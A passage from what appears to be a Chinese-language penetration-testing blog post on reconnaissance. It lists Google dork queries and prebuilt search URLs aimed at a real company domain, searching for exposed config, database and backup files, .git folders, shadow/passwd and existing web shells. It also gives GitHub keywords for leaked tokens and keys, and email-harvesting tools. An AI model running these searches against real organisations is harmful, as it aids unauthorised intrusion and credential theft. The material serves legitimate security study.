class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Code share sites</span></span><br><span class=\"line\">site:http://ideone.com | site:http://codebeautify.org | site:http://codeshare.io | site:http://codepen.io | site:http://repl.it | site:http://jsfiddle.net &quot;company&quot;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">GitLab/GitHub/Bitbucket</span></span><br><span class=\"line\">site:github.com | site:gitlab.com | site:bitbucket.org &quot;company&quot;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Stackoverflow</span></span><br><span class=\"line\">site:stackoverflow.com &quot;target.com&quot;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Project management sites</span></span><br><span class=\"line\">site:http://trello.com | site:*.atlassian.net &quot;company&quot;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Pastebin-like sites</span></span><br><span class=\"line\">site:http://justpaste.it | site:http://pastebin.com &quot;company&quot;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Config files</span></span><br><span class=\"line\">site:target.com ext:xml | ext:conf | ext:cnf | ext:reg | ext:inf | ext:rdp | ext:cfg | ext:txt | ext:ora | ext:env | ext:ini</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Database files</span></span><br><span class=\"line\">site:target.com ext:sql | ext:dbf | ext:mdb</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Backup files</span></span><br><span class=\"line\">site:target.com ext:bkf | ext:bkp | ext:bak | ext:old | ext:backup</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">.git folder</span></span><br><span class=\"line\">inurl:&quot;/.git&quot; target.com -github</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Exposed documents</span></span><br><span class=\"line\">site:target.com ext:doc | ext:docx | ext:odt | ext:pdf | ext:rtf | ext:sxw | ext:psw | ext:ppt | ext:pptx | ext:pps | ext:csv</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Other files</span></span><br><span class=\"line\">site:target.com intitle:index.of | ext:log | ext:php intitle:phpinfo &quot;published by the PHP Group&quot; | inurl:shell | inurl:backdoor | inurl:wso | inurl:cmd | shadow | passwd | boot.ini | inurl:backdoor | inurl:readme | inurl:license | inurl:install | inurl:setup | inurl:config | inurl:&quot;/phpinfo.php&quot; | inurl:&quot;.htaccess&quot; | ext:swf</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">SQL errors</span></span><br><span class=\"line\">site:target.com intext:&quot;sql syntax near&quot; | intext:&quot;syntax error has occurred&quot; | intext:&quot;incorrect syntax near&quot; | intext:&quot;unexpected end of SQL command&quot; | intext:&quot;Warning: mysql_connect()&quot; | intext:&quot;Warning: mysql_query()&quot; | intext:&quot;Warning: pg_connect()&quot;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">PHP errors</span></span><br><span class=\"line\">site:target.com &quot;PHP Parse error&quot; | &quot;PHP Warning&quot; | &quot;PHP Error&quot;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Login pages</span></span><br><span class=\"line\">site:target.com inurl:signup | inurl:register | intitle:Signup</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Open redirects</span></span><br><span class=\"line\">site:target.com inurl:redir | inurl:url | inurl:redirect | inurl:return | inurl:src=http | inurl:r=http</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Apache Struts RCE</span></span><br><span class=\"line\">site:target.com ext:action | ext:struts | ext:do</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Search <span class=\"keyword\">in</span> pastebin</span></span><br><span class=\"line\">site:pastebin.com target.com</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Linkedin employees</span></span><br><span class=\"line\">site:linkedin.com employees target.com</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Wordpress files</span></span><br><span class=\"line\">site:target.com inurl:wp-content | inurl:wp-includes</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Subdomains</span></span><br><span class=\"line\">site:*.target.com</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Sub-subdomains</span></span><br><span class=\"line\">site:*.*.target.com</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">Find S3 Buckets</span></span><br><span class=\"line\">site:.s3.amazonaws.com | site:http://storage.googleapis.com | site:http://amazonaws.com &quot;target&quot;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Traefik</span></span><br><span class=\"line\">intitle:traefik inurl:8080/dashboard &quot;target&quot;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Jenkins</span></span><br><span class=\"line\">intitle:&quot;Dashboard [Jenkins]&quot;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Other 3rd parties sites</span></span><br><span class=\"line\">https://www.google.com/search?q=site%3Agitter.im%20%7C%20site%3Apapaly.com%20%7C%20site%3Aproductforums.google.com%20%7C%20site%3Acoggle.it%20%7C%20site%3Areplt.it%20%7C%20site%3Aycombinator.com%20%7C%20site%3Alibraries.io%20%7C%20site%3Anpm.runkit.com%20%7C%20site%3Anpmjs.com%20%7C%20site%3Ascribd.com%20%22united%22</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Backup files</span></span><br><span class=\"line\">https://www.google.com/search?q=site%3Aunited.com%20ext%3Abkf%20%7C%20ext%3Abkp%20%7C%20ext%3Abak%20%7C%20ext%3Aold%20%7C%20ext%3Abackup</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Login pages</span></span><br><span class=\"line\">https://www.google.com/search?q=site%3Aunited.com%20inurl%3Asignup%20%7C%20inurl%3Aregister%20%7C%20intitle%3ASignup</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Config files</span></span><br><span class=\"line\">https://www.google.com/search?q=site%3Aunited.com%20ext%3Axml%20%7C%20ext%3Aconf%20%7C%20ext%3Acnf%20%7C%20ext%3Areg%20%7C%20ext%3Ainf%20%7C%20ext%3Ardp%20%7C%20ext%3Acfg%20%7C%20ext%3Atxt%20%7C%20ext%3Aora%20%7C%20ext%3Aenv%20%7C%20ext%3Aini</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">.git folder</span></span><br><span class=\"line\">https://www.google.com/search?q=inurl%3A%5C%22%2F.git%5C%22%20united.com%20-github</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Database files</span></span><br><span class=\"line\">https://www.google.com/search?q=site%3Aunited.com%20ext%3Asql%20%7C%20ext%3Adbf%20%7C%20ext%3Amdb</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Open redirects</span></span><br><span class=\"line\">https://www.google.com/search?q=site%3Aunited.com%20inurl%3Aredir%20%7C%20inurl%3Aurl%20%7C%20inurl%3Aredirect%20%7C%20inurl%3Areturn%20%7C%20inurl%3Asrc%3Dhttp%20%7C%20inurl%3Ar%3Dhttp</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Code share sites</span></span><br><span class=\"line\">https://www.google.com/search?q=site%3Asharecode.io%20%7C%20site%3Acontrolc.com%20%7C%20site%3Acodepad.co%20%7Csite%3Aideone.com%20%7C%20site%3Acodebeautify.org%20%7C%20site%3Ajsdelivr.com%20%7C%20site%3Acodeshare.io%20%7C%20site%3Acodepen.io%20%7C%20site%3Arepl.it%20%7C%20site%3Ajsfiddle.net%20%22united%22</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Pastebin-like sites</span></span><br><span class=\"line\">https://www.google.com/search?q=site%3Ajustpaste.it%20%7C%20site%3Aheypasteit.com%20%7C%20site%3Apastebin.com%20%22united%22</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Linkedin employees</span></span><br><span class=\"line\">https://www.google.com/search?q=site%3Alinkedin.com%20employees%20united.com</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">Project management sites</span></span><br><span class=\"line\">https://www.google.com/search?q=site%3Atrello.com%20%7C%20site%3A*.atlassian.net%20%22united%22</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Other files</span></span><br><span class=\"line\">https://www.google.com/search?q=site%3Aunited.com%20intitle%3Aindex.of%20%7C%20ext%3Alog%20%7C%20ext%3Aphp%20intitle%3Aphpinfo%20%5C%22published%20by%20the%20PHP%20Group%5C%22%20%7C%20inurl%3Ashell%20%7C%20inurl%3Abackdoor%20%7C%20inurl%3Awso%20%7C%20inurl%3Acmd%20%7C%20shadow%20%7C%20passwd%20%7C%20boot.ini%20%7C%20inurl%3Abackdoor%20%7C%20inurl%3Areadme%20%7C%20inurl%3Alicense%20%7C%20inurl%3Ainstall%20%7C%20inurl%3Asetup%20%7C%20inurl%3Aconfig%20%7C%20inurl%3A%5C%22%2Fphpinfo.php%5C%22%20%7C%20inurl%3A%5C%22.htaccess%5C%22%20%7C%20ext%3Aswf</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Sub-subdomains</span></span><br><span class=\"line\">https://www.google.com/search?q=site%3A*.*.united.com</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Jenkins</span></span><br><span class=\"line\">https://www.google.com/search?q=intitle%3A%5C%22Dashboard%20%5BJenkins%5D%5C%22%20%22united%22</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Traefik</span></span><br><span class=\"line\">https://www.google.com/search?q=intitle%3Atraefik%20inurl%3A8080%2Fdashboard%20%22united%22</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Cloud buckets S3/GCP</span></span><br><span class=\"line\">https://www.google.com/search?q=site%3A.s3.amazonaws.com%20%7C%20site%3Astorage.googleapis.com%20%7C%20site%3Aamazonaws.com%20%22united%22</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">SQL errors</span></span><br><span class=\"line\">https://www.google.com/search?q=site%3Aunited.com%20intext%3A%5C%22sql%20syntax%20near%5C%22%20%7C%20intext%3A%5C%22syntax%20error%20has%20occurred%5C%22%20%7C%20intext%3A%5C%22incorrect%20syntax%20near%5C%22%20%7C%20intext%3A%5C%22unexpected%20end%20of%20SQL%20command%5C%22%20%7C%20intext%3A%5C%22Warning%3A%20mysql_connect()%5C%22%20%7C%20intext%3A%5C%22Warning%3A%20mysql_query()%5C%22%20%7C%20intext%3A%5C%22Warning%3A%20pg_connect()%5C%22</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Exposed documents</span></span><br><span class=\"line\">https://www.google.com/search?q=site%3Aunited.com%20ext%3Adoc%20%7C%20ext%3Adocx%20%7C%20ext%3Aodt%20%7C%20ext%3Apdf%20%7C%20ext%3Artf%20%7C%20ext%3Asxw%20%7C%20ext%3Apsw%20%7C%20ext%3Appt%20%7C%20ext%3Apptx%20%7C%20ext%3Apps%20%7C%20ext%3Acsv</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Wordpress files</span></span><br><span class=\"line\">https://www.google.com/search?q=site%3Aunited.com%20inurl%3Awp-content%20%7C%20inurl%3Awp-includes</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Apache Struts RCE</span></span><br><span class=\"line\">https://www.google.com/search?q=site%3Aunited.com%20ext%3Aaction%20%7C%20ext%3Astruts%20%7C%20ext%3Ado</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">GitLab/GitHub/Bitbucket</span></span><br><span class=\"line\">https://www.google.com/search?q=site%3Agithub.com%20%7C%20site%3Agitlab.com%20%7C%20site%3Abitbucket.org%20%22united%22</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Subdomains</span></span><br><span class=\"line\">https://www.google.com/search?q=site%3A*.united.com</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">Stackoverflow</span></span><br><span class=\"line\">https://www.google.com/search?q=site%3Astackoverflow.com%20%22united.com%22</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">PHP errors</span></span><br><span class=\"line\">https://www.google.com/search?q=site%3Aunited.com%20%5C%22PHP%20Parse%20error%5C%22%20%7C%20%5C%22PHP%20Warning%5C%22%20%7C%20%5C%22PHP%20Error%5C%22</span><br></pre></td></tr></table></figure>\n<h2 id=\"Github\"><a href=\"#Github\" class=\"headerlink\" title=\"Github\"></a>Github</h2><ul>\n<li>Github高级搜索：<a href=\"https://github.com/search/advanced\">https://github.com/search/advanced</a></li>\n<li>GitDorker：<a href=\"https://github.com/obheda12/GitDorker\">https://github.com/obheda12/GitDorker</a></li>\n<li>gitdorks_go：<a href=\"https://github.com/damit5/gitdorks_go\">https://github.com/damit5/gitdorks_go</a></li>\n</ul>\n<p>keywords：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot;token&quot;</span><br><span class=\"line\">&quot;password&quot;</span><br><span class=\"line\">&quot;secret&quot;</span><br><span class=\"line\">&quot;passwd&quot;</span><br><span class=\"line\">&quot;username&quot;</span><br><span class=\"line\">&quot;key&quot;</span><br><span class=\"line\">&quot;apidocs&quot;</span><br><span class=\"line\">&quot;appspot&quot;</span><br><span class=\"line\">&quot;auth&quot;</span><br><span class=\"line\">&quot;aws_access&quot;</span><br><span class=\"line\">&quot;config&quot;</span><br><span class=\"line\">&quot;credentials&quot;</span><br><span class=\"line\">&quot;dbuser&quot;</span><br><span class=\"line\">&quot;ftp&quot;</span><br><span class=\"line\">&quot;login&quot;</span><br><span class=\"line\">&quot;mailchimp&quot;</span><br><span class=\"line\">&quot;mailgun&quot;</span><br><span class=\"line\">&quot;mysql&quot;</span><br><span class=\"line\">&quot;pass&quot;</span><br><span class=\"line\">&quot;pem private&quot;</span><br><span class=\"line\">&quot;prod&quot;</span><br><span class=\"line\">&quot;pwd&quot;</span><br><span class=\"line\">&quot;secure&quot;</span><br><span class=\"line\">&quot;ssh&quot;</span><br><span class=\"line\">&quot;staging&quot;</span><br><span class=\"line\">&quot;stg&quot;</span><br><span class=\"line\">&quot;stripe&quot;</span><br><span class=\"line\">&quot;swagger&quot;</span><br><span class=\"line\">&quot;testuser&quot;</span><br><span class=\"line\">&quot;jdbc&quot;</span><br></pre></td></tr></table></figure>\n\n<p>除了 Github 外，还有一些其他的代码平台：</p>\n<ul>\n<li>GitLab: <a href=\"https://about.gitlab.com/\">https://about.gitlab.com/</a></li>\n<li>Gitee: <a href=\"https://gitee.com/\">https://gitee.com/</a></li>\n<li>Bitbucket: <a href=\"https://bitbucket.org/\">https://bitbucket.org/</a></li>\n</ul>\n<h2 id=\"Stack-Overflow\"><a href=\"#Stack-Overflow\" class=\"headerlink\" title=\"Stack Overflow\"></a>Stack Overflow</h2><p>Stackoverflow：<a href=\"https://stackoverflow.com/\">https://stackoverflow.com/</a></p>\n<p>Stack Overflow 日志：</p>\n<ul>\n<li><a href=\"https://archive.org/details/stackexchange\">https://archive.org/details/stackexchange</a></li>\n<li><a href=\"https://archive.org/download/stackexchange\">https://archive.org/download/stackexchange</a></li>\n</ul>\n<p>敏感信息可能包括：</p>\n<ul>\n<li>github key</li>\n<li>简历&#x2F;邮箱&#x2F;手机号</li>\n</ul>\n<h2 id=\"社交平台\"><a href=\"#社交平台\" class=\"headerlink\" title=\"社交平台\"></a>社交平台</h2><p>结合 Google Search</p>\n<ul>\n<li>语雀：<a href=\"https://www.yuque.com/dashboard\">https://www.yuque.com/dashboard</a></li>\n<li>印象识堂：<a href=\"https://www.yinxiang.com/everhub/\">https://www.yinxiang.com/everhub/</a></li>\n<li>wolai：<a href=\"https://www.wolai.com/\">https://www.wolai.com/</a></li>\n<li>腾讯文档：<a href=\"https://docs.qq.com/\">https://docs.qq.com</a></li>\n<li>飞书文档：<a href=\"https://docs.feishu.cn/\">https://docs.feishu.cn</a></li>\n<li>蓝湖：<a href=\"https://lanhuapp.com/\">https://lanhuapp.com/</a></li>\n</ul>\n<h2 id=\"历史页面\"><a href=\"#历史页面\" class=\"headerlink\" title=\"历史页面\"></a>历史页面</h2><ul>\n<li>Wayback Machine：<a href=\"https://archive.org/web\">https://archive.org/web</a></li>\n<li>waybackurls：<a href=\"https://github.com/tomnomnom/waybackurls\">https://github.com/tomnomnom/waybackurls</a></li>\n<li>gau：<a href=\"https://github.com/lc/gau\">https://github.com/lc/gau</a></li>\n</ul>\n<h2 id=\"网盘\"><a href=\"#网盘\" class=\"headerlink\" title=\"网盘\"></a>网盘</h2><ul>\n<li>搜索导航：e.g. <a href=\"https://adzhp.xyz/sites/3983.html\">https://adzhp.xyz/sites/3983.html</a></li>\n<li>聚合搜索：e.g. <a href=\"https://www.chaonengsou.com/\">https://www.chaonengsou.com/</a></li>\n<li>蓝奏云：<a href=\"https://www.lanzoux.com/\">https://www.lanzoux.com</a></li>\n<li>天翼云：<a href=\"https://www.ctyun.cn/\">https://www.ctyun.cn</a></li>\n<li>阿里云盘：<a href=\"https://www.aliyundrive.com/\">https://www.aliyundrive.com</a></li>\n<li>城通网盘：<a href=\"https://www.ctfile.com/\">https://www.ctfile.com</a></li>\n<li>夸克网盘：<a href=\"https://pan.quark.cn/\">https://pan.quark.cn</a></li>\n<li>新浪微盘</li>\n</ul>\n<h2 id=\"邮箱\"><a href=\"#邮箱\" class=\"headerlink\" title=\"邮箱\"></a>邮箱</h2><ul>\n<li>Hunter：<a href=\"https://hunter.io/\">https://hunter.io</a></li>\n<li>Snov.io：<a href=\"https://app.snov.io/\">https://app.snov.io</a></li>\n<li>Phonebook：also works on subdomains and urls <a href=\"https://phonebook.cz/\">https://phonebook.cz</a></li>\n<li>Skymem：<a href=\"https://www.skymem.info/\">https://www.skymem.info</a></li>\n<li>email-format：<a href=\"https://www.email-format.com/i/search/\">https://www.email-format.com/i/search/</a></li>\n<li>搜邮箱：<a href=\"https://souyouxiang.com/find-contact/\">https://souyouxiang.com/find-contact/</a></li>\n<li>theHarvester：also works on subdomains <a href=\"https://github.com/laramies/theHarvester\">https://github.com/laramies/theHarvester</a></li>\n</ul>\n<h3 id=\"Hunter\"><a href=\"#Hunter\" class=\"headerlink\" title=\"Hunter\"></a>Hunter</h3><p><img src=\"/images/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20231124162353785.png\"></p>\n<h3 id=\"Snov-io\"><a href=\"#Snov-io\" class=\"headerlink\" title=\"Snov.io\"></a>Snov.io</h3><p><img src=\"/images/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20231124163506452.png\"></p>\n<h3 id=\"Phonebook\"><a href=\"#Phonebook\" class=\"headerlink\" title=\"Phonebook\"></a>Phonebook</h3><p><img src=\"/images/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20231124163603784.png\"></p>\n<h3 id=\"Skymem\"><a href=\"#Skymem\" class=\"headerlink\" title=\"Skymem\"></a>Skymem</h3><p><img src=\"/images%5C%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%5Cimage-20231124163743384.png\"></p>\n<h3 id=\"email-format\"><a href=\"#email-format\" class=\"headerlink\" title=\"email-format\"></a>email-format</h3><p><img src=\"/images/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20231124163836496.png\"></p>\n<h3 id=\"搜邮箱\"><a href=\"#搜邮箱\" class=\"headerlink\" title=\"搜邮箱\"></a>搜邮箱</h3><p><img src=\"/images/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20231124163031668.png\"></p>\n<h3 id=\"theHarvester\"><a href=\"#theHarvester\" class=\"headerlink\" title=\"theHarvester\"></a>theHarvester</h3><p><img src=\"/images/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20231124164253796.png\"><br></style></p>\n","cover_type":"img","excerpt":"","more":"<h1 id=\"信息收集-敏感信息收集\"><a href=\"#信息收集-敏感信息收集\" class=\"headerlink\" title=\"信息收集-敏感信息收集\"></a>信息收集-敏感信息收集</h1><h2 id=\"Google\"><a href=\"#Google\" class=\"headerlink\" title=\"Google\"></a>Google</h2><ul>\n<li>Google Hacking Database：<a href=\"https://www.exploit-db.com/google-hacking-database\">https://www.exploit-db.com/google-hacking-database</a></li>\n<li>Google Hacking：<a href=\"https://pentest-tools.com/information-gathering/google-hacking\">https://pentest-tools.com/information-gathering/google-hacking</a></li>\n<li>Google Dork：<a href=\"https://cxsecurity.com/dorks/\">https://cxsecurity.com/dorks/</a></li>\n</ul>\n<h3 id=\"基础语法\"><a href=\"#基础语法\" class=\"headerlink\" title=\"基础语法\"></a>基础语法</h3><h4 id=\"管理后台地址\"><a href=\"#管理后台地址\" class=\"headerlink\" title=\"管理后台地址\"></a>管理后台地址</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">site:target.com intext:管理 | 后台 | 后台管理 | 登陆 | 登录 | 用户名 | 密码 | 系统 | 账号 | login | system</span><br><span class=\"line\">site:target.com inurl:login | inurl:admin | inurl:manage | inurl:manager | inurl:admin_login | inurl:system | inurl:backend</span><br><span class=\"line\">site:target.com intitle:管理 | 后台 | 后台管理 | 登陆 | 登录</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"上传类漏洞地址\"><a href=\"#上传类漏洞地址\" class=\"headerlink\" title=\"上传类漏洞地址\"></a>上传类漏洞地址</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">site:target.com inurl:file</span><br><span class=\"line\">site:target.com inurl:upload</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"注入页面\"><a href=\"#注入页面\" class=\"headerlink\" title=\"注入页面\"></a>注入页面</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">site:target.com inurl:?id=</span><br><span class=\"line\">site:target.com inurl:php?id=</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"编辑器页面\"><a href=\"#编辑器页面\" class=\"headerlink\" title=\"编辑器页面\"></a>编辑器页面</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">site:target.com inurl:ewebeditor</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"目录遍历漏洞\"><a href=\"#目录遍历漏洞\" class=\"headerlink\" title=\"目录遍历漏洞\"></a>目录遍历漏洞</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">site:target.com intitle: &quot;index of&quot;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"URL-跳转\"><a 